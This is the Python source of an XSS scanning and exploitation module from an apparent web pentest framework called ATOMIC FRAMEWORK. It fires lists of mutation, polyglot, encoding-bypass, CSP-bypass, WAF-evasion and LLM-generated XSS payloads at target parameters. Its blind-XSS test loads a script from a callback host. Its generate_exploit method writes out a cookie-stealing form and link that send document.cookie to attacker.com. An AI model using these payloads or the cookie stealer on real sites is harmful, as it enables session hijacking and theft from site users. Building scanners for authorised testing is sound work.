#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - XSS Module
Cross-Site Scripting detection and exploitation
"""

import re


from config import Payloads, Colors


class XSSModule:
    """XSS Testing Module"""

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "XSS"

        # XSS signatures
        self.xss_signatures = [
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
            "onmouseover=",
            "onclick=",
            "onfocus=",
            "eval(",
            "alert(",
            "confirm(",
            "prompt(",
        ]

    def test(self, url: str, method: str, param: str, value: str):
        """Test for XSS"""
        # Test reflected XSS
        self._test_reflected(url, method, param, value)

        # Test stored XSS (limited)
        self._test_stored(url, method, param, value)

        # Test DOM XSS indicators
        self._test_dom(url, method, param, value)

        # Test mutation XSS
        self._test_mxss(url, method, param, value)

        # Test blind XSS
        self._test_blind_xss(url, method, param, value)

        # Test CSP bypass
        self._test_csp_bypass(url, method, param, value)

        # Test polyglot payloads
        self._test_polyglot(url, method, param, value)

        # Test encoding bypass
        self._test_encoding_bypass(url, method, param, value)

        # LLM-generated adaptive XSS payloads
        self._test_llm_payloads(url, method, param, value)

    def _test_mxss(self, url: str, method: str, param: str, value: str):
        """Test for mutation XSS (mXSS)"""
        payloads = [
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "<details open ontoggle=alert(1)>",
        ]
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if payload in response.text or "onerror" in response.text.lower():
                    from core.engine import Finding

                    finding = Finding(
                        technique="XSS (Mutation XSS / mXSS)",
                        url=url,
                        severity="HIGH",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence="mXSS payload reflected in response",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_blind_xss(self, url: str, method: str, param: str, value: str):
        """Test for blind XSS via callback"""
        cb = self.engine.config.get("callback_domain", "xss.callback.example.com")
        payloads = [
            f'"><script src=https://{cb}/x></script>',
            f"'><img src=x onerror=fetch('https://{cb}/'+document.domain)>",
        ]
        for payload in payloads:
            try:
                self.requester.request(url, method, data={param: payload})
                from core.engine import Finding

                finding = Finding(
                    technique="XSS (Blind XSS Callback)",
                    url=url,
                    severity="INFO",
                    confidence=0.3,
                    param=param,
                    payload=payload,
                    evidence=f"Blind XSS payload injected — verify callback at {cb}",
                )
                self.engine.add_finding(finding)
                return
            except Exception:
                continue

    def _test_csp_bypass(self, url: str, method: str, param: str, value: str):
        """Test for CSP bypass XSS"""
        payloads = [
            '<base href="https://evil.example.com/">',
            '{{constructor.constructor("alert(1)")()}}',
        ]
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if payload in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XSS (CSP Bypass)",
                        url=url,
                        severity="HIGH",
                        confidence=0.7,
                        param=param,
                        payload=payload,
                        evidence="CSP bypass payload reflected",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_polyglot(self, url: str, method: str, param: str, value: str):
        """Test for XSS with polyglot payloads"""
        payloads = [
            "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
            "'-alert()-'",
            "</script><svg onload=alert()>",
            "'\"><svg/onload=alert(1)//",
            "<img src=x onerror=alert(1)//>",
            "<video><source onerror=alert(1)>",
            "<body onpageshow=alert(1)>",
        ]
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if payload in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XSS (Polyglot)",
                        url=url,
                        severity="HIGH",
                        confidence=0.8,
                        param=param,
                        payload=payload,
                        evidence="Polyglot XSS payload reflected",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_encoding_bypass(self, url: str, method: str, param: str, value: str):
        """Test for XSS with encoding bypass payloads"""
        payloads = [
            "<svg/onload=alert(1)>",  # No quotes, no spaces
            "<img src=x onerror=alert`1`>",  # Template literal
            "<svg onload=alert&lpar;1&rpar;>",  # HTML entity parentheses
            "\\u003csvg onload=alert(1)\\u003e",  # Unicode escape
            "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",  # HTML entity function name
        ]
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if payload in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XSS (Encoding Bypass)",
                        url=url,
                        severity="HIGH",
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence="Encoding bypass payload reflected unmodified",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated adaptive XSS payloads.

        Uses Qwen2.5-7B to produce context-aware payloads when the local
        LLM is loaded (``--local-llm``).  Gracefully skips otherwise.
        """
        ai = getattr(self.engine, "ai", None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads("xss", param)
        if not llm_payloads:
            return

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                if payload in response.text:
                    from core.engine import Finding

                    finding = Finding(
                        technique="XSS (AI-generated Reflected)",
                        url=url,
                        severity="HIGH",
                        confidence=0.80,
                        param=param,
                        payload=payload,
                        evidence="AI payload reflected unescaped in response",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def test_url(self, url: str):
        """Test URL for XSS"""

    def _test_reflected(self, url: str, method: str, param: str, value: str):
        """Test for reflected XSS"""
        payloads = Payloads.XSS_PAYLOADS

        # Apply WAF bypass if enabled
        if self.engine.config.get("waf_bypass"):
            all_payloads = []
            for p in payloads:
                all_payloads.extend(self.requester.waf_bypass_encode(p))
            payloads = list(set(all_payloads))

        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if not response:
                    continue

                response_text = response.text

                # Check if payload is reflected
                if payload in response_text:
                    # Detect HTML context of the reflection
                    context_info = ""
                    context_confidence = None
                    escaped_payload = re.escape(payload)
                    if re.search(r"<script[^>]*>.*?" + escaped_payload, response_text, re.DOTALL | re.IGNORECASE):
                        context_info = " (reflected inside <script> tag context)"
                        context_confidence = 0.95
                    elif re.search(r'=[\'"]' + escaped_payload, response_text):
                        context_info = " (reflected inside HTML attribute context)"
                        context_confidence = 0.85

                    # Check if it's properly sanitized
                    sanitized = self._is_sanitized(payload, response_text)

                    from core.engine import Finding

                    if not sanitized:
                        finding = Finding(
                            technique="XSS (Reflected)",
                            url=url,
                            severity="HIGH",
                            confidence=context_confidence if context_confidence else 0.9,
                            param=param,
                            payload=payload,
                            evidence="Payload reflected without sanitization" + context_info,
                        )
                    else:
                        finding = Finding(
                            technique="XSS (Potentially Filtered)",
                            url=url,
                            severity="MEDIUM",
                            confidence=context_confidence if context_confidence else 0.6,
                            param=param,
                            payload=payload,
                            evidence="Payload reflected but may be sanitized" + context_info,
                        )

                    self.engine.add_finding(finding)
                    return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'XSS test error: {e}')}")

    def _test_stored(self, url: str, method: str, param: str, value: str):
        """Test for stored XSS (basic check)"""
        # Use a unique marker to identify our payload
        import uuid

        marker = f"xss_{uuid.uuid4().hex[:8]}"
        stored_payloads = [
            f'<script>alert("{marker}")</script>',
            f'<img src=x onerror=alert("{marker}")>',
        ]

        for payload in stored_payloads:
            try:
                # Submit the payload
                data = {param: payload}
                response = self.requester.request(url, method, data=data)

                if response and response.status_code == 200:
                    # Re-fetch the same page to check if payload is stored
                    verify_response = self.requester.request(url, "GET")

                    if verify_response and marker in verify_response.text:
                        # Check if full payload (not just the marker text) is reflected
                        if payload in verify_response.text:
                            from core.engine import Finding

                            finding = Finding(
                                technique="XSS (Stored)",
                                url=url,
                                severity="CRITICAL",
                                confidence=0.85,
                                param=param,
                                payload=payload,
                                evidence="Payload persisted and reflected on page reload",
                            )
                            self.engine.add_finding(finding)
                            return

            except Exception as e:
                if self.engine.config.get("verbose"):
                    print(f"{Colors.error(f'Stored XSS test error: {e}')}")

    def _test_dom(self, url: str, method: str, param: str, value: str):
        """Test for DOM XSS indicators"""
        dom_indicators = [
            "document.write",
            "document.location",
            "window.location",
            "eval(",
            "innerHTML",
            "outerHTML",
            "insertAdjacentHTML",
            "setTimeout(",
            "setInterval(",
        ]

        try:
            response = self.requester.request(url, "GET")

            if not response:
                return

            for indicator in dom_indicators:
                if indicator in response.text:
                    # Check if user input reaches these sinks
                    test_value = "xss_test_12345"
                    data = {param: test_value}

                    test_response = self.requester.request(url, method, data=data)

                    if test_response and test_value in test_response.text:
                        # Check if it's near a DOM sink
                        pattern = rf"{re.escape(indicator)}.*{re.escape(test_value)}|{re.escape(test_value)}.*{re.escape(indicator)}"
                        if re.search(pattern, test_response.text, re.DOTALL):
                            from core.engine import Finding

                            finding = Finding(
                                technique="XSS (DOM-based)",
                                url=url,
                                severity="MEDIUM",
                                confidence=0.7,
                                param=param,
                                payload=test_value,
                                evidence=f"User input reaches DOM sink: {indicator}",
                            )
                            self.engine.add_finding(finding)
                            return

        except Exception as e:
            if self.engine.config.get("verbose"):
                print(f"{Colors.error(f'DOM XSS test error: {e}')}")

    def _is_sanitized(self, payload: str, response: str) -> bool:
        """Check if payload was sanitized"""
        # Check for common sanitization patterns
        sanitized_patterns = [
            "&lt;",  # HTML entities
            "&gt;",
            "&quot;",
            "&#x3C;",  # Hex encoding
            "&#x3E;",
            "\\x3c",  # JS escaping
            "\\x3e",
            "\\u003c",  # Unicode escaping
            "\\u003e",
        ]

        for pattern in sanitized_patterns:
            if pattern in response:
                return True

        # Check if script tags were removed
        if "<script>" in payload and "<script>" not in response:
            return True

        return False

    def generate_exploit(self, url: str, param: str, xss_type: str = "reflected") -> str:
        """Generate XSS exploit code"""
        if xss_type == "reflected":
            exploit = f"""
<!-- XSS Exploit -->
<form action="{url}" method="GET">
    <input type="hidden" name="{param}" value='<script>fetch("http://attacker.com/?c="+document.cookie)</script>'>
    <input type="submit" value="Click to steal cookies">
</form>

<!-- Or direct link -->
<a href="{url}?{param}=<script>fetch('http://attacker.com/?c='+document.cookie)</script>">Click here</a>
"""
        else:
            exploit = """
<!-- Stored XSS would be triggered when visiting the affected page -->
<script>
// Cookie stealer
fetch('http://attacker.com/?c=' + document.cookie);
</script>
"""

        return exploit
